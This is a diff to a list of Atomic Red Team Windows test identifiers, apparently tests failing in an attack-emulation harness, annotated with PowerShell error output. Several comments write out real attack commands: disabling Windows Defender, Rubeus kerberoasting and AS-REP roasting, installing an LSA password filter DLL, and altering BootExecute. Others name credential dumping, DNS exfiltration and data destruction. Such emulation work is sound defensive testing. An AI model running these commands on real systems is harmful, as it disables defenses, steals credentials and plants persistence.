+	"atomic_windows_depfalse_pshtrue__t1071_004__command-and-control__application_layer_protocol-_dns__08faa1ff79f2c8e48a2869a830c210f7", # ['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist.At line:1 char:1+ Set-Location "PathToAtomicsFolder"; .\\T1071.004\\src\\T1071-dns-beacon. ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ToAtomicsFolder:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\T1071.004\\src\\T1071-dns-beacon.ps1 : The term \'.\\T1071.004\\src\\T1071-dns-beacon.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:37+ ... n "PathToAtomicsFolder"; .\\T1071.004\\src\\T1071-dns-beacon.ps1 -Domain ...+                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\T1071.004\\src\\T1071-dns-beacon.ps1:String) [], CommandNotFoundExcepti    on    + FullyQualifiedErrorId : CommandNotFoundException ']
+
+	# Cannot find path 'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist
+	"atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__45f462c09f28d5b0819af7b1ed0913e1", # ['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist.At line:1 char:1+ Set-Location "PathToAtomicsFolder"; .\\T1572\\src\\T1572-doh-domain-leng ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ToAtomicsFolder:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\T1572\\src\\T1572-doh-domain-length.ps1 : The term \'.\\T1572\\src\\T1572-doh-domain-length.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:37+ ... PathToAtomicsFolder"; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohSer ...+                           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\T1572\\src\\T1572-doh-domain-length.ps1:String) [], CommandNotFoundExce    ption    + FullyQualifiedErrorId : CommandNotFoundException '] # ['Set-Location "PathToAtomicsFolder"; .\\T1572\\src\\T1572-doh-domain-length.ps1 -DohServer']
+ 	"atomic_windows_depfalse_pshtrue__t1572__command-and-control__protocol_tunneling__6e214f0f17e5d4988aa1085ad4291f46", # ['Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\' because it does not exist.At line:1 char:1+ Set-Location "PathToAtomicsFolder"; .\\T1572\\src\\T1572-doh-beacon.ps1  ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ToAtomicsFolder:String) [Set-Location], ItemNotFoundE    xception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand .\\T1572\\src\\T1572-doh-beacon.ps1 : The term \'.\\T1572\\src\\T1572-doh-beacon.ps1\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:37+ ... ation "PathToAtomicsFolder"; .\\T1572\\src\\T1572-doh-beacon.ps1 -DohSer ...+                                  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (.\\T1572\\src\\T1572-doh-beacon.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException '] # ['Set-Location "PathToAtomicsFolder"; .\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer']
+
+
+
+	# Could not find a part of the path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\<X>\
+	"atomic_windows_depfalse_pshtrue__t1569_002__execution__system_services-_service_execution__e4c51df716410dc7baccead922f9d9a4", # ['Invoke-WebRequest : Could not find a part of the path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\PsTools.zip\'.At line:1 char:81+ ... { ; } else {Invoke-WebRequest "https://download.sysinternals.com/file ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [Invoke-WebRequest], DirectoryNotFoundException    + FullyQualifiedErrorId : System.IO.DirectoryNotFoundException,Microsoft.PowerShell.Commands.InvokeWebRequestComma    nd Expand-Archive : The path \'PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip\' either does not exist or is not a valid file system path.At line:1 char:217+ ... Tools.zip"; Expand-Archive "PathToAtomicsFolder\\..\\ExternalPayloads\\P ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (PathToAtomicsFo...ads\\PsTools.zip:String) [Expand-Archive], InvalidOpe    rationException    + FullyQualifiedErrorId : ArchiveCmdletPathNotFound,Expand-Archive Copy-Item : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\PsTools\\PsExec.exe\' because it does not exist.At line:1 char:458+ ... | Out-Null; Copy-Item "PathToAtomicsFolder\\..\\ExternalPayloads\\PsTool ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ools\\PsExec.exe:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand copy : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\PsExec.exe\' because it does not exist.At line:1 char:893+ ... D /f      ; copy "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...oads\\PsExec.exe:String) [Copy-Item], ItemNotFoundExce    ption    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand \'C:\\Users\\puma-4\\AppData\\Local\\Temp\\psexec.exe\' is not recognized as an internal or external command,operable program or batch file.']
+	"atomic_windows_depfalse_pshtrue__t1564__defense-evasion__hide_artifacts__b7f89af9214876eae185527350ca034f", # ['Exception calling "ReadAllText" with "1" argument(s): "Could not find a part of the path \'C:\\Users\\puma-4\\Desktop\\PathToAtomicsFolder\\T1564\\src\\T1564-macrocode.txt\'."At line:1 char:1+ $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\\T1564\\src ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException    + FullyQualifiedErrorId : DirectoryNotFoundException Invoke-MalDoc : Cannot bind argument to parameter \'macroCode\' because it is an empty string.At line:1 char:426+ ... Doc.ps1" -UseBasicParsing); Invoke-Maldoc -macroCode "$macro" -office ...+                                                          ~~~~~~~~    + CategoryInfo          : InvalidData: (:) [Invoke-MalDoc], ParameterBindingValidationException    + FullyQualifiedErrorId : ParameterArgumentValidationErrorEmptyStringNotAllowed,Invoke-MalDoc ']
+	"atomic_windows_depfalse_pshtrue__t1547_012__multiple__boot_or_logon_autostart_execution-_print_processors__b2725f4e411b9328aa73fe54501a7564", # ['Copy-Item : Cannot find path \'C:\\T1547.012\\bin\\AtomicTest.dll\' because it does not exist.At line:1 char:132+ ... op spooler; Copy-Item "$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\T1547.012\\bin\\AtomicTest.dll:String) [Copy-Item], ItemNotFoundExcept    ion    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.CopyItemCommand ']
+	"atomic_windows_depfalse_pshtrue__t1539__credential-access__steal_web_session_cookie__126aaf80c6a232eaf08dcef3163d4aed", # ['out-file : Could not find a part of the path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\T1539ChromeCookies.txt\'.At line:1 char:329+ ... \\Cookies" | out-file -filepath "PathToAtomicsFolder\\..\\ExternalPayloa ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : OpenError: (:) [Out-File], DirectoryNotFoundException    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand ']
+
+	# The path \'PathToAtomicsFolder\\<X>' either does not exist or is not a valid file system path
+	"atomic_windows_depfalse_pshtrue__t1074_001__collection__data_staged-_local_data_staging__885997e230cb2b9dc3cc7e9d8ec5a6d8", # ['Compress-Archive : The path \'PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_zip\' either does not exist or is not a valid file system path.At line:1 char:1+ Compress-Archive -Path "PathToAtomicsFolder\\T1074.001\\bin\\Folder_to_z ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : InvalidArgument: (PathToAtomicsFo...n\\Folder_to_zip:String) [Compress-Archive], InvalidO    perationException    + FullyQualifiedErrorId : ArchiveCmdletPathNotFound,Compress-Archive ']
+
+
+	# The system cannot find the file specified. (PathToAtomicsFolder\\..\\ExternalPayloads\<X>)
+	"atomic_windows_depfalse_pshtrue__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__0402c74f97e712d03605175c5ba9675b", # ['Try {cmd /c "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe" /EXEFilename "$env:systemroot\\System32\\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}; if(0){;   $CommandToRun = rmdir "$env:programdata\\Microsoft\\Windows Defender" -Recurse;   Try {cmd /c "PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe" /EXEFilename "$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}; }']
+	"atomic_windows_depfalse_pshtrue__t1558_004__credential-access__steal_or_forge_kerberos_tickets-_as-rep_roasting__358926f4adef63bf95d152e35df4dab3", # ['cmd.exe /c "PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" asreproast /outfile:"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt"']
+	"atomic_windows_depfalse_pshtrue__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__eedc7881da4d2fddb5c56fb96aaeecfd", # ['klist purge; cmd.exe /c "PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" kerberoast None /outfile:"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus_output.txt"']
+
+	# ERROR: Unable to write to the file. There may be a disk or file system error.
+	"atomic_windows_depfalse_pshtrue__t1556_002__multiple__modify_authentication_process-_password_filter_dll__cc7f0eb8b9115b271eaaa42c9b6f3dca", # ['reg.exe export HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\ "PathToAtomicsFolder\\T1556.002\\lsa_backup.reg"; $passwordFilterName = (Copy-Item "PathToAtomicsFolder\\T1556.002\\bin\\AtomicRedTeamPWFilter.dll" -Destination "C:\\Windows\\System32" -PassThru).basename; $lsaKey = Get-Item "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"; $notificationPackagesValues = $lsaKey.GetValue("Notification Packages"); $notificationPackagesValues += $passwordFilterName; Set-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\" "Notification Packages" $notificationPackagesValues']
+	"atomic_windows_depfalse_pshtrue__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__acf646b22c5d2c2b1058feb7da1f3bdc", # ['if (!(Test-Path "$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg")) { reg.exe export "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" "$PathToAtomicsFolder\\T1547.001\\src\\SessionManagerBackup.reg" /y }; Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" -Name "BootExecute" -Value "autocheck autoche *" -Type MultiString']
+
 
 	# The module 'PathToAtomicsFolder' could not be loaded.
-	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__08a146a382df6fea9fa2275073e9d245",
-	"atomic_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__608e19b5f7e210ba73e207289e5a1314",
-	"atomic_windows_depfalse_pshtrue__t1049__discovery__system_network_connections_discovery__6e3d4c708ab0ff571eb05691cc8bcdda",
+	"atomic_windows_depfalse_pshtrue__t1070_006__defense-evasion__indicator_removal_on_host-_timestomp__08a146a382df6fea9fa2275073e9d245", # ['import-module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:1+ import-module "PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1" ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...s\\timestomp.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand timestomp : The term \'timestomp\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:72+ ... ToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1"; timestomp -dest " ...+                                                         ~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (timestomp:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1069_001__discovery__permission_groups_discovery-_local_groups__608e19b5f7e210ba73e207289e5a1314", # ['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:71+ ...  > $null; & "PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.exe"  ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...\\SharpHound.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']
+	"atomic_windows_depfalse_pshtrue__t1049__discovery__system_network_connections_discovery__6e3d4c708ab0ff571eb05691cc8bcdda", # ["PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe : The module 'PathToAtomicsFolder' could not be loaded. For more information, run 'Import-Module PathToAtomicsFolder'.At line:1 char:114+ ... taxList) {; PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $sy ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...s\\SharpView.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe : The module 'PathToAtomicsFolder' could not be loaded. For more information, run 'Import-Module PathToAtomicsFolder'.At line:1 char:114+ ... taxList) {; PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $sy ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...s\\SharpView.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe : The module 'PathToAtomicsFolder' could not be loaded. For more information, run 'Import-Module PathToAtomicsFolder'.At line:1 char:114+ ... taxList) {; PathToAtomicsFolder\\..\\ExternalPayloads\\SharpView.exe $sy ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...s\\SharpView.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule "]
+	"atomic_windows_depfalse_pshtrue__t1552_006__credential-access__unsecured_credentials-_group_policy_preferences__e93d024cd93ceaaf880d6f799ef1c9c8", # ['. : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:3+ . "PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1"; Get- ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...GPPPassword.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule Get-GPPPassword : The term \'Get-GPPPassword\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:66+ ... der\\..\\ExternalPayloads\\Get-GPPPassword.ps1"; Get-GPPPassword -Verbos ...+                                                   ~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Get-GPPPassword:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1550_003__multiple__use_alternate_authentication_material-_pass_the_ticket__566388d2f3073aced1a2c86b3a65826c", # ['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:3+ & "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" -accepteula \\\\ ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...oads\\PsExec.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule Set-Location : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\' because it does not exist.At line:1 char:236+ ... cket.kirbi; Set-Location "PathToAtomicsFolder\\..\\ExternalPayloads"; M ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4\\Desktop\\ExternalPayloads:String) [Set-Location], ItemNo    tFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.SetLocationCommand Move-Item : Cannot find path \'\\\\localhost\\c$\\ticket.kirbi\' because it does not exist.At line:1 char:292+ ... lPayloads"; Move-Item -Force "\\\\localhost\\c$\\ticket.kirbi" ticket.kir ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (\\\\localhost\\c$\\ticket.kirbi:String) [Move-Item], ItemNotFoundException    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.MoveItemCommand & : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:446+ ... m local"; & "PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" askt ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...oads\\rubeus.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule Remove-Item : Cannot find path \'C:\\Users\\puma-4\\Desktop\\ExternalPayloads\\ticket.kirbi\' because it does not exist.At line:1 char:557+ ... kirbi /ptt; Remove-Item "PathToAtomicsFolder\\..\\ExternalPayloads\\tick ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (C:\\Users\\puma-4...ds\\ticket.kirbi:String) [Remove-Item], ItemNotFoundEx    ception    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.RemoveItemCommand & : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:627+ ... t.kirbi"; & "PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" purg ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...oads\\rubeus.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']
+	"atomic_windows_depfalse_pshtrue__t1485__impact__data_destruction__b74b60096fb49650e27e470047a2b9c9", # ['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:150+ ... -Force }; & "PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete. ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...ete\\sdelete.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']
+	"atomic_windows_depfalse_pshtrue__t1187__credential-access__forced_authentication__608b7021a5b8369e9fd858feba6f5611", # ['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:3+ & "PathToAtomicsFolder\\..\\ExternalPayloads\\PetitPotam.exe" 10.0.0.3 1 ...+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...\\PetitPotam.exe:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']
+	"atomic_windows_depfalse_pshtrue__t1114_001__collection__email_collection-_local_email_collection__21363f92027047ce1dbfdd47f7a483b5", # ["PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1 : The module 'PathToAtomicsFolder' could not be loaded. For more information, run 'Import-Module PathToAtomicsFolder'.At line:1 char:1+ PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1 -file C:\\Users\\puma-4 ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...c\\Get-Inbox.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule "]
+	"atomic_windows_depfalse_pshtrue__t1090_003__command-and-control__proxy-_multi-hop_proxy__f21623deb932dc0db3f00068ba15bf32", # ['& : The module \'PathToAtomicsFolder\' could not be loaded. For more information, run \'Import-Module PathToAtomicsFolder\'.At line:1 char:3+ & "PathToAtomicsFolder\\T1090.003\\src\\Psiphon.bat"+   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...src\\Psiphon.bat:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule ']
+	"atomic_windows_depfalse_pshtrue__t1087_002__discovery__account_discovery-_domain_account__9ccef9b46ce26850bb709a83d8e538ae", # ["PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1 : The module 'PathToAtomicsFolder' could not be loaded. For more information, run 'Import-Module PathToAtomicsFolder'.At line:1 char:1+ PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (PathToAtomicsFo...ads\\ADRecon.ps1:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CouldNotAutoLoadModule "]
+
+
 
 	# The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\<X>\' was not loaded because no valid module file was found in any module directory
-	"atomic_windows_depfalse_pshtrue__t1048__exfiltration__exfiltration_over_alternative_protocol__35b68f98acbdbdde166d4154462d2467",
-	"atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212",
+	"atomic_windows_depfalse_pshtrue__t1048__exfiltration__exfiltration_over_alternative_protocol__35b68f98acbdbdde166d4154462d2467", # ['Import-Module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:1+ Import-Module "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1"; ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...ds\\dnsexfil.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand Invoke-DNSExfiltrator : The term \'Invoke-DNSExfiltrator\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:71+ ... lder\\..\\ExternalPayloads\\dnsexfil.ps1"; Invoke-DNSExfiltrator -i "Pat ...+                                             ~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Invoke-DNSExfiltrator:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212", # ['Import-Module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:533+ ... fore green; Import-Module "PathToAtomicsFolder\\..\\ExternalPayloads\\Po ...+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...s\\PowerDump.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand Invoke-PowerDump : The term \'Invoke-PowerDump\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:604+ ... hToAtomicsFolder\\..\\ExternalPayloads\\PowerDump.ps1"; Invoke-PowerDump+                                                          ~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Invoke-PowerDump:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException ']
+	"atomic_windows_depfalse_pshtrue__t1482__discovery__domain_trust_discovery__ff659febed01ef020792aa5f83d08d6d", # ['Import-Module : The specified module \'PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1\' was not loaded because no valid module file was found in any module directory.At line:1 char:1+ Import-Module "PathToAtomicsFolder\\..\\ExternalPayloads\\PowerView.ps1" ...+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ResourceUnavailable: (PathToAtomicsFo...s\\PowerView.ps1:String) [Import-Module], FileNot    FoundException    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand Get-NetDomainTrust : The term \'Get-NetDomainTrust\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:72+ ... Folder\\..\\ExternalPayloads\\PowerView.ps1"; Get-NetDomainTrust; Get-Ne ...+                                                ~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Get-NetDomainTrust:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Get-NetForestTrust : The term \'Get-NetForestTrust\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:92+ ... yloads\\PowerView.ps1"; Get-NetDomainTrust; Get-NetForestTrust; Get-AD ...+                                                ~~~~~~~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Get-NetForestTrust:String) [], CommandNotFoundException    + FullyQualifiedErrorId : CommandNotFoundException Get-ADDomain : The term \'Get-ADDomain\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.At line:1 char:112+ ... ew.ps1"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-AD ...+                                                      ~~~~~~~~~~~~    + CategoryInfo          : ObjectNotFound: (Get-ADDomain:String) [], CommandNotFoundException    + 